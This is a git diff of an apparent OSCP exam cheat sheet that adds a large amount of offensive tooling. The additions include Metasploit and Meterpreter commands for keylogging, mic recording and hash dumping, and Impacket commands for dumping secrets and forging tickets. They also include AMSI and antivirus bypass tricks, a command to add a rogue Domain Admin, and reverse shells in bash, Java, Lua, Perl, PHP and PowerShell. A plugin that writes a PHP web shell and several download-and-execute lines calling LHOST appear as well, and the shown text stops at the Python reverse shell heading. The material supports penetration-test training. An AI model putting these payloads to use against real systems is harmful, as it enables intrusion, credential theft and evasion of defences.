@@ -70,7 +70,7 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 		- [John](https://github.com/0xsyr0/OSCP#john)
 	- [Exploitation Tools](https://github.com/0xsyr0/OSCP#exploitation-tools-1)
 		- [ImageTragick Polyglot Attack](https://github.com/0xsyr0/OSCP#imagetragick-polyglot-attack)
-		- [Impacket](https://github.com/0xsyr0/OSCP#impacket)
+		- [Metasploit](https://github.com/0xsyr0/OSCP#metasploit)
 		- [ShellShock](https://github.com/0xsyr0/OSCP#shellshock)
 	- [Post Exploitation](https://github.com/0xsyr0/OSCP#post-exploitation-1)
 		- [AppLocker Bypass List](https://github.com/0xsyr0/OSCP#applocker-bypass-list)
@@ -81,8 +81,9 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 		- [Evil-WinRM](https://github.com/0xsyr0/OSCP#evil-winrm)
 		- [find Commands](https://github.com/0xsyr0/OSCP#find-commands)
 		- [grep for Passwords](https://github.com/0xsyr0/OSCP#grep-for-passwords)
+		- [Impacket](https://github.com/0xsyr0/OSCP#impacket)
 		- [Juicy Potato](https://github.com/0xsyr0/OSCP#juicy-potato)
-		- [PowerShell & Powercat](https://github.com/0xsyr0/OSCP#powershell--powercat)
+		- [PowerShell](https://github.com/0xsyr0/OSCP#powershell)
 		- [Windows Tasks & Services](https://github.com/0xsyr0/OSCP#windows-tasks--services)
 		- [Writeable Directories in Linux](https://github.com/0xsyr0/OSCP#writeable-directories-in-linux)
 	- [Payloads](https://github.com/0xsyr0/OSCP#payloads-1)
@@ -179,7 +180,6 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 
 | Name | URL |
 | --- | --- |
-| Impacket | https://github.com/SecureAuthCorp/impacket |
 | lsassy | https://github.com/Hackndo/lsassy |
 | Rubeus | https://github.com/GhostPack/Rubeus |
 | printspoofer | https://github.com/dievus/printspoofer |
@@ -198,9 +198,10 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 | Watson | https://github.com/rasta-mouse/Watson |
 | WESNG | https://github.com/bitsadmin/wesng
 | Sherlock | https://github.com/rasta-mouse/Sherlock |
+| scavenger | https://github.com/SpiderLabs/scavenger |
 | GTFOBins | https://gtfobins.github.io/ |
 | LOLBAS | https://lolbas-project.github.io/ |
-| scavenger | https://github.com/SpiderLabs/scavenger |
+| Impacket | https://github.com/SecureAuthCorp/impacket |
 | powercat | https://github.com/besimorhino/powercat |
 | PowerView | https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1 |
 | GenericPotato | https://github.com/micahvandeusen/GenericPotato |
@@ -265,6 +266,7 @@ Commands, Payloads and Resources for the Offensive Security Certified Profession
 | CVE-2022-30190 | MS-MSDT Follina Exploit PoC | https://github.com/onecloudemoji/CVE-2022-30190 |
 | CVE-2022-30190 | MS-MSDT Follina Exploit Python Implementation | https://github.com/chvancooten/follina.py |
 | CVE-2022-34918 | LPE Netfilter Kernel Exploit | https://github.com/randorisec/CVE-2022-34918-LPE-PoC |
+| n/a | SeBackupPrivilege | https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug |
 | n/a | RoguePotato | https://github.com/antonioCoco/RoguePotato |
 | n/a | RottenPotatoNG | https://github.com/breenmachine/RottenPotatoNG |
 | n/a | GenericPotato | https://github.com/micahvandeusen/GenericPotato |
@@ -1224,49 +1226,169 @@ poc.svg
 $ convert poc.svg poc.png
 ```
 
-#### Impacket
+#### Metasploit
 
-##### Basic Commands
-
-```c
-psexec.py <USERNAME>@<RHOST>
-sudo impacket-smbserver local . -smb2support
-rpcdump.py <TARGET_DOMAIN>/<USERNAME>:<PASSWORD/HASH>@<RHOST>
-smbclient.py <TARGET_DOMAIN>/<USERNAME>:<PASSWORD/HASH>@<RHOST>
-lookupsid.py <TARGET_DOMAIN>/<USERNAME>:<PASSWORD/HASH>@<RHOST>
-reg.py <TARGET_DOMAIN>/<USERNAME>:[<PASSWORD>:<PASSWORD/HASH>]@<RHOST> <ACTION> <ACTION>
-```
-
-##### Database Connections
+##### General Usage
 
 ```c
-mssqlclient.py <USERNAME>@<RHOST>
-mssqlclient.py <USERNAME>@<RHOST> -windows-auth
+$ sudo msfdb init                  // database initialization
+msf6 > search                      // search within metasploit
+msf6 > set RHOST <RHOST>           // set remote host
+msf6 > set RPORT <RPORT>           // set remote port
+msf6 > run                         // run exploit
+msf6 > spool /PATH/TO/FILE         // recording screen output
+msf6 > save                        // saves current state
+msf6 > exploit                     // using module exploit
+msf6 > payload                     // using module payload
+msf6 > auxiliary                   // using module auxiliary
+msf6 > encoder                     // using module encoder
+msf6 > nop                         // using module nop
+msf6 > show sessions               // displays all current sessions
+msf6 > sessions -i 1               // switch to session 1
+msf6 > db_nmap -sC <RHOST>         // using nmap
+msf6 > jobs                        // showing all current jobs
+msf6 > hosts                       // displaying hosts
+msf6 > services                    // displaying services
+msf6 > vulns                       // displaying vulnerabilities
+msf6 > show payloads               // displaying available payloads
+msf6 > set VERBOSE true            // enable verbose output
+msf6 > set forceexploit true       // exploits the target anyways
+msf6 > use post/multi/manage/shell_to_meterpreter    // shell to meterpreter
+msf6 > use exploit/windows/http/oracle_event_processing_upload    // use a specific module
+C:\> > Ctrl + z                                  // put active meterpreter shell in background
+meterpreter > background                         // put meterpreter in background (same as "bg")
+meterpreter > shell                              // get a system shell
+meterpreter > channel -i <ID>                    // get back to existing meterpreter shell
+meterpreter > ps                                 // checking processes
+meterpreter > migrate 2236                       // migrate to a process
+meterpreter > getuid                             // get the user id
+meterpreter > sysinfo                            // get system information
+meterpreter > upload                             // uploading local files to the target
+meterpreter > ipconfig                           // get network configuration
+meterpreter > load kiwi                          // load mimikatz
+meterpreter > getprivs                           // get privileges after loading mimikatz
+meterpreter > getsystem                          // gain system privileges if user is member of administrator group
+meterpreter > hashdump                           // dumps all the user hashes
+meterpreter > run post/windows/gather/checkvm    // check status of the target
+meterpreter > run post/multi/recon/local_exploit_suggester    // checking for exploits
+meterpreter > run post/windows/manage/enable_rdp              // enables rdp
+meterpreter > run post/multi/manage/autoroute                 // runs autoroutes
+meterpreter > run auxiliary/server/socks4a                    // runs socks4 proxy server
+meterpreter > keyscan_start                                   // enabled keylogger
+meterpreter > keyscan_dump                                    // showing the output
+meterpreter > screenshare                                     // realtime screen sharing
+meterpreter > screenshare -q 100                              // realtime screen sharing
+meterpreter > record_mic                                      // recording mic output
+meterpreter > timestomp                                       // modify timestamps
+meterpreter > execute -f calc.exe                             // starts a program on the victim
+meterpreter > portfwd add -l <LPORT> -p <RPORT> -r 127.0.0.1    // port forwarding
 ```
 
-##### Forging Silver Ticket
+##### Metasploit through Proxychains
 
 ```c
-getST.py intelligence.htb/svc_int$  -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
+$ proxychains -q msfconsole
 ```
-##### ASPRepRoast
+
+##### Meterpreter Listener
+
+###### Generate Payload
 
 ```c
-GetNPUsers.py <TARGET_DOMAIN>.local/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o meterpreter_payload.exe
 ```
 
-##### PassTheHash
+###### Setup Listener for Microsoft Windows
 
 ```c
-getTGT.py <TARGET_DOMAIN>.local/<USERNAME> -dc-ip <TARGET_DOMAIN>.local -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST <LHOST>
+LHOST => <LHOST>
+msf6 exploit(multi/handler) > set LPORT <LPORT>
+LPORT => <LPORT>
+msf6 exploit(multi/handler) > run
 ```
 
-##### SecretsDump
+###### Download Files
 
 ```c
-secretsdump.py <TARGET_DOMAIN>/<USERNAME>@<RHOST>
-secretsdump.py -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe -o <FILE>exe
 ```
+
+```c
+msf6 > use exploit/multi/handler
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
+payload => windows/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set LHOST <LHOST>
+LHOST => <LHOST>
+msf6 exploit(multi/handler) > set LPORT <LPORT>
+LPORT => <LPORT>
+msf6 exploit(multi/handler) > run
+```
+
+```c
+C:\> .\<FILE>.exe
+```
+
+```c
+meterpreter > download *
+```
+
+##### Enumeration
+
+###### SNMP Scan
+
+```c
+msf6 > use auxiliary/scanner/snmp/snmp_login
+msf6 auxiliary(scanner/snmp/snmp_login) > set RHOSTS <RHOST>
+msf6 auxiliary(scanner/snmp/snmp_login) > run
+```
+
+###### SNMP Enum
+
+```c
+msf6 > use auxiliary/scanner/snmp/snmp_enum
+msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS <RHOST>
+msf6 auxiliary(scanner/snmp/snmp_enum) > run
+```
+
+###### Tomcat Enumeration
+
+```c
+msf6 > use auxiliary/scanner/http/tomcat_mgr_login
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RHOSTS <RHOST>
+msf6 auxiliary(scanner/http/tomcat_mgr_login) > run
+```
+
+###### Exploit Suggester
+
+```c
+msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
+msf6 post(multi/recon/local_exploit_suggester) > set session 1
+msf6 post(multi/recon/local_exploit_suggester) > run
+```
+
+##### Auxiliary Handling
+
+###### Auxiliary Setup
+
+```c
+msf6 > use auxiliary/scanner/http/tvt_nvms_traversal
+msf6 auxiliary(scanner/http/tvt_nvms_traversal) > set RHOSTS <RHOST>
+msf6 auxiliary(scanner/http/tvt_nvms_traversal) > set FILEPATH Users/Nathan/Desktop/Passwords.txt
+msf6 auxiliary(scanner/http/tvt_nvms_traversal) > run
+```
+
+###### Auxiliary Output Directory
+
+```c
+/home/kali/.msf4/loot/20200623090635_default_<RHOST>_nvms.traversal_680948.txt
+```
+
 #### ShellShock
 
 ```c
@@ -1274,6 +1396,20 @@ curl -H 'Cookie: () { :;}; /bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' http:/
 ```
 
 ### Post Exploitation
+
+#### AMSI
+
+##### Test String
+
+```c
+PS C:\> $str = 'amsiinitfailed'
+```
+
+##### Bypass
+
+```c
+PS C:\> $str = 'ams' + 'ii' + 'nitf' + 'ailed'
+```
 
 #### AppLocker Bypass List
 
@@ -1304,6 +1440,7 @@ powershell -c "$SecPass = Convertto-securestring 'Welcome1!' -AsPlainText -Force
 ```
 
 #### Bash Privilege Escalation
+
 ```c
 sudo -u#-1 /bin/bash
 ```
@@ -1363,6 +1500,102 @@ grep -roiE "password.{20}"
 grep -oiE "password.{20}" /etc/*.conf
 ```
 
+#### Impacket
+
+```c
+$ impacket-smbserver local . -smb2support
+$ impacket-reg <TARGET_DOMAIN>/<USERNAME>:<PASSWORD:PASSWORD_HASH>@<RHOST> <ACTION> <ACTION>
+$ impacket-services <TARGET_DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST> <ACTION>
+$ impacket-netview <TARGET_DOMAIN>/<USERNAME> -targets /PATH/TO/FILE/<FILE>.txt -users /PATH/TO/FILE/<FILE>.txt
+$ impacket-lookupsid <TARGET_DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
+$ impacket-GetADUsers -all -dc-ip <RHOST> <TARGET_DOMAIN>/
+$ impacket-getST <TARGET_DOMAIN>/<USERNAME>$  -spn WWW/<DOMAIN_CONTROLLER>.<TARGET_DOMAIN> -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate Administrator
+$ impacket-rpcdump <TARGET_DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
+$ impacket-samrdump <TARGET_DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
+$ impacket-atexec -k -no-pass <TARGET_DOMAIN>/Administrator@<DOMAIN_CONTROLLER>.<TARGET_DOMAIN> 'type C:\PATH\TO\FILE\<FILE>'
+```
+
+##### impacket-smbclient
+
+```c
+$ export KRB5CCNAME=<USERNAME>.ccache
+$ impacket-smbclient <TARGET_DOMAIN>/<USERNAME>:<PASSWORD/PASSWORD_HASH>@<RHOST>
+$ impacket-smbclient -k <TARGET_DOMAIN>/<USERNAME>@<RHOST>.<TARGET_DOMAIN> -no-pass
+```
+
+##### impacket-getTGT
+
+```c
+$ impacket-getTGT <TARGET_DOMAIN>/<USERNAME>:<PASSWORD>
+$ impacket-getTGT <TARGET_DOMAIN>/<USERNAME> -dc-ip <TARGET_DOMAIN> -hashes aad3b435b51404eeaad3b435b51404ee:7c662956a4a0486a80fbb2403c5a9c2c
+```
+
+##### impacket-GetNPUsers
+
+```c
+$ impacket-GetNPUsers <TARGET_DOMAIN>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
+$ impacket-GetNPUsers <TARGET_DOMAIN>/<USERNAME> -request -no-pass -dc-ip <RHOST>
+$ impacket-GetNPUsers <TARGET_DOMAIN>/ -usersfile usernames.txt -format john -outputfile hashes
+```
+
+##### impacket-getUserSPNs / GetUserSPNs.py
+
+```c
+$ export KRB5CCNAME=<USERNAME>.ccache
+$ impacket-GetUserSPNs <TARGET_DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<TARGET_DOMAIN> -no-pass -request
+$ ./GetUserSPNs.py <TARGET_DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <RHOST>.<TARGET_DOMAIN> -no-pass -request
+```
+
+##### impacket-secretsdump
+
+```c
+$ export KRB5CCNAME=<USERNAME>.ccache
+$ impacket-secretsdump <TARGET_DOMAIN>/<USERNAME>@<RHOST>
+$ impacket-secretsdump -k <TARGET_DOMAIN>/<USERNAME>@<RHOST>.<TARGET_DOMAIN> -no-pass -debug
+$ impacket-secretsdump -ntds ndts.dit -system system -hashes lmhash:nthash LOCAL -output nt-hash
+$ impacket-secretsdump -dc-ip <RHOST> <TARGET_DOMAIN>.LOCAL/svc_bes:<PASSWORD>@<RHOST>
+$ impacket-secretsdump -sam SAM -security SECURITY -system SYSTEM LOCAL
+```
+
+##### impacket-psexec
+
+```c
+$ impacket-psexec <USERNAME>@<RHOST>
+$ impacket-psexec <TARGET_DOMAIN>/administrator@<RHOST> -hashes aad3b435b51404eeaad3b435b51404ee:8a4b77d52b1845bfe949ed1b9643bb18
+```
+
+##### impacket-ticketer
+
+###### Requirements
+
+* Valid User
+* NTHASH
+* Domain-SID
+
+```c
+$ export KRB5CCNAME=<USERNAME>.ccache
+$ impacket-ticketer -nthash C1929E1263DDFF6A2BCC6E053E705F78 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain <TARGET_DOMAIN> -spn MSSQLSVC/<RHOST>.<TARGET_DOMAIN> -user-id 500 Administrator
+```
+
+##### Fixing [-] exceptions must derive from BaseException
+
+###### Issue
+
+```c
+$ ./GetUserSPNs.py <TARGET_DOMAIN>/<USERNAME>:<PASSWORD> -k -dc-ip <DOMAIN_CONTROLLER>.<TARGET_DOMAIN> -no-pass -request
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[-] exceptions must derive from BaseException
+```
+
+###### To fix it:
+
+```c
+241         if self.__doKerberos:
+242             #target = self.getMachineName()
+243             target = self.__kdcHost
+```
+
 #### Juicy Potato
 
 ```c
@@ -1377,26 +1610,180 @@ msf6 exploit(multi/handler) > run
 .\exploit.exe
 ```
 
-#### PowerShell & Powercat
+#### PowerShell
+
+##### General Usage
+
+###### Allow Script Execution
 
 ```c
-Set-ExecutionPolicy Unrestricted
+PS C:\> set-executionpolicy remotesigned
+PS C:\> Set-ExecutionPolicy unrestricted
+```
 
-powershell -Command "$PSVersionTable.PSVersion"    # check powershell version
+##### Script Execution Bypass
 
-powershell -c "[Environment]::Is64BitProcess"    # check for 64bit powershell
+```c
+PS C:\> powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1
+```
 
-cmd /c powershell -nop -exec bypass -c "iex(new-object net.webclient).downloadstring('http://<LHOST>:<LPORT>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <LHOST> -Port <LPORT>"
+##### Import Module to PowerShell cmdlet
 
-powershell -c "(new-object System.Net.WebClient).DownloadFile(\"http://<LHOST>:<LPORT>/nc.exe\",\"C:\Users\Public\Downloads\nc.exe\")"
+```c
+PS C:\> import-module ./<module / powershell script>
+```
 
-powershell (New-Object System.Net.WebClient).UploadFile('http://<LHOST>/upload.php', '<FILE>')
+##### Check PowerShell Versions
 
-powershell -c "Invoke-Webrequest -Uri \"http://<LHOST>:<LPORT>/shell.exe\" -OutFile \"C:\Users\Public\Downloads\shell.exe\""
+```c
+$ PS Set-ExecutionPolicy Unrestricted
+$ PS powershell -Command "$PSVersionTable.PSVersion"
+$ PS powershell -c "[Environment]::Is64BitProcess"
+```
 
-<RHOST>/node/3?cmd=powershell -c IEX(New-object System.net.webclient).DownloadString('http://<LHOST>:<local:port>/Sherlock.ps1');Find-AllVulns
+##### Start offsec Session
 
-echo "IEX (New-object System.net.webclient).DownloadString('http://<LHOST>:<LPORT>/shell.ps1')" | powershell -noprofile -
+```c
+PS /home/kali> $offsec_session = New-PSSession -ComputerName <RHOST> -Authentication Negotiate -Credential <USERNAME>
+PS /home/kali> Enter-PSSession $offsec_session
+```
+
+##### PSCredential
+
+```c
+Import-CliXml
+Export-CliXml
+```
+
+```c
+PS C:\> powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"
+```
+
+#### AntiVirus Handling
+
+##### AntiVirus Bypass for Invoke-Expression (IEX)
+
+```c
+PS C:\> <COMMAND> | & ( $PsHOme[4]+$PShoMe[30]+'x')
+```
+
+###### Explaination
+
+```c
+$PSHome[4]     // equals "i"
+$PSHome[30]    // equals "e"
++x             // adds an "x"
+```
+
+##### Alternative
+
+```c
+PS C:\> $eNV:COmSPeC[4,15,25]-JOiN''
+```
+
+###### Explaination
+
+```c
+$eNV:COmSPeC[4]     // equals "i"
+$eNV:COmSPeC[15]    // equals "e"
+$eNV:COmSPeC[25}    // equals "x"
+```
+
+##### System
+
+###### Show current User
+
+```c
+PS C:\> whoami /all
+PS C:\> getuserid
+```
+
+###### Show Groups
+
+```c
+PS C:\> whoami /groups
+```
+
+###### Get System Information
+
+```c
+PS C:\> systeminfo
+```
+
+###### Get Process List
+
+```c
+PS C:\> Get-Process
+```
+
+###### Get net user Information
+
+```c
+PS C:\> net users
+PS C:\> net users <USERNAME>
+```
+
+###### Get User List
+
+```c
+PS C:\> Get-ADUser -Filter * -SearchBase "DC=<TARGET_DOMAIN>,DC=LOCAL"
+```
+
+###### Invoke-Expression File Transfer
+
+```c
+PS C:\> IEX(IWR http://<LHOST>/<FILE>.ps1) -UseBasicParsing)
+```
+
+###### Add new Domain Administrator
+
+```c
+PS C:\> $PASSWORD= ConvertTo-SecureString –AsPlainText -Force -String <PASSWORD>
+PS C:\> New-ADUser -Name "<USERNAME>" -Description "<DESCRIPTION>" -Enabled $true -AccountPassword $PASSWORD
+PS C:\> Add-ADGroupMember -Identity "Domain Admins" -Member <USERNAME>
+```
+
+###### Execute Commands in User Context
+
+```c
+PS C:\> $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlaintext -Force
+PS C:\> $cred = New-Object System.Management.Automation.PSCredential ("<DOMAIN>\<USERNAME>", $pass)
+PS C:\> Invoke-Command -computername <COMPUTERNAME> -ConfigurationName dc_manage -credential $cred -command {whoami}
+```
+
+###### Execute Scripts with Credentials (Reverse Shell)
+
+```c
+PS C:\Windows\system32> $pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
+PS C:\Windows\system32> $cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\<USERNAME>", $pass)
+PS C:\Windows\system32> Invoke-Command -Computer <RHOST> -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://<LHOST>/<FILE>.ps1') } -Credential $cred
+```
+
+###### New-PSSession
+
+```c
+PS C:\Users\<USERNAME>\Downloads\backups> $username = "<DOMAIN>\<USERNAME>"
+$username = "<DOMAIN>\<USERNAME>"
+PS C:\Users\<USERNAME>\Downloads\backups> $password = "<PASSWORD>"
+$password = "<PASSWORD>"
+PS C:\Users\<USERNAME>\Downloads\backups> $secstr = New-Object -TypeName System.Security.SecureString
+$secstr = New-Object -TypeName System.Security.SecureString
+PS C:\Users\<USERNAME>\Downloads\backups> $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+PS C:\Users\<USERNAME>\Downloads\backups> $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
+$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
+PS C:\Users\<USERNAME>\Downloads\backups> new-pssession -computername . -credential $cred
+new-pssession -computername . -credential $cred
+
+ Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
+ -- ----            ------------    ------------    -----         -----------------     ------------
+  1 WinRM1          localhost       RemoteMachine   Opened        Microsoft.PowerShell     Available
+
+PS C:\Users\<USERNAME>\Downloads\backups> enter-pssession 1
+enter-pssession 1
+[localhost]: PS C:\Users\<USERNAME>\Documents> whoami
+whoami
+<DOMAIN>\<USERNAME>
 ```
 
 #### Windows Tasks & Services
@@ -1430,38 +1817,196 @@ wmic qfe get Caption,Description,HotFixID,InstalledOn    # no new patches - KEXP
 
 #### Reverse Shells
 
+##### Bash Reverse Shell
+
 ```c
-bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
-bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
+$ bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
+$ bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'
+$ echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' | base64
+```
 
-http://<TARGET_URL>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT>/tmp/f")--    # lua
+##### curl Reverse Shell
 
-nc -e /bin/sh <LHOST> <LPORT>
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f
+```c
+$ curl --header "Content-Type: application/json" --request POST http://<RHOST>:<RPORT>/upload --data '{"auth": {"name": "<USERNAME>", "password": "<PASSWORD>"}, "filename" : "& echo "bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"|base64 -d|bash"}'
+```
 
+##### JAVA Reverse Shell
+
+```c
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+$ r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<LHOST>/<LPORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]); p.waitFor();
+```
+
+###### shell.jar
+
+```c
+package <NAME>;
+
+import org.bukkit.plugin.java.JavaPlugin;
+
+import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.nio.file.StandardOpenOption;
+
+public class Main extends JavaPlugin {
+   @Override
+   public void onDisable() {
+     super.onDisable();
+   }
+
+@Override
+public void onEnable() {
+  final String PHP_CODE = "<?php system($_GET['cmd']); ?>";
+  try {
+   Files.write(Paths.get("/var/www/<TARGET_DOMAIN>/shell.php"), PHP_CODE.getBytes(), StandardOpenOption.CREATE_NEW);
+   } catch (IOException e) {
+     e.printStackTrace();
+   }
+
+   super.onEnable();
+  }
+}
+```
+
+##### Lua Reverse Shell
+
+```c
+http://<TARGET_URL>');os.execute("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT>/tmp/f")--
+```
+
+##### Markdown Reverse Shell
+
+```c
+--';bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1;'--
+```
+
+##### mkfifo Reverse Shell
+
+```c
+$ mkfifo /tmp/shell; nc <LHOST> <LPORT> 0</tmp/shell | /bin/sh >/tmp/shell 2>&1; rm /tmp/shell
+```
+
+##### Netcat Reverse Shell
+
+```c
+$ nc -e /bin/sh <LHOST> <LPORT>
+```
+
+##### Perl Reverse Shell
+
+```c
 perl -e 'use Socket;$i="<LHOST>";$p=<LPORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
 
-php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
+##### PHP Reverse Shell
 
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+```c
+$ php -r '$sock=fsockopen("<LHOST>",<LPORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
 
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+##### PowerShell Reverse Shell
 
-ruby -rsocket -e'f=TCPSocket.open("<LHOST>",<LPORT>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+```c
+$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+
+```c
+$ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
+
+```c
+$  powershell -nop -exec bypass -c '$client = New-Object System.Net.Sockets.TCPClient("<LHOST>",<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+```
+
+##### minireverse.ps1
+
+```c
+$socket = new-object System.Net.Sockets.TcpClient('127.0.0.1', 413);
+if($socket -eq $null){exit 1}
+$stream = $socket.GetStream();
+$writer = new-object System.IO.StreamWriter($stream);
+$buffer = new-object System.Byte[] 1024;
+$encoding = new-object System.Text.AsciiEncoding;
+do
+{
+	$writer.Flush();
+	$read = $null;
+	$res = ""
+	while($stream.DataAvailable -or $read -eq $null) {
+		$read = $stream.Read($buffer, 0, 1024)
+	}
+	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","");
+	if(!$out.equals("exit")){
+		$args = "";
+		if($out.IndexOf(' ') -gt -1){
+			$args = $out.substring($out.IndexOf(' ')+1);
+			$out = $out.substring(0,$out.IndexOf(' '));
+			if($args.split(' ').length -gt 1){
+                $pinfo = New-Object System.Diagnostics.ProcessStartInfo
+                $pinfo.FileName = "cmd.exe"
+                $pinfo.RedirectStandardError = $true
+                $pinfo.RedirectStandardOutput = $true
+                $pinfo.UseShellExecute = $false
+                $pinfo.Arguments = "/c $out $args"
+                $p = New-Object System.Diagnostics.Process
+                $p.StartInfo = $pinfo
+                $p.Start() | Out-Null
+                $p.WaitForExit()
+                $stdout = $p.StandardOutput.ReadToEnd()
+                $stderr = $p.StandardError.ReadToEnd()
+                if ($p.ExitCode -ne 0) {
+                    $res = $stderr
+                } else {
+                    $res = $stdout
+                }
+			}
+			else{
+				$res = (&"$out" "$args") | out-string;
+			}
+		}
+		else{
+			$res = (&"$out") | out-string;
+		}
+		if($res -ne $null){
+        $writer.WriteLine($res)
+    }
+	}
+}While (!$out.equals("exit"))
+$writer.close();
+$socket.close();
+$stream.Dispose()
+```
+
+##### Python Reverse Shell
+
+```c
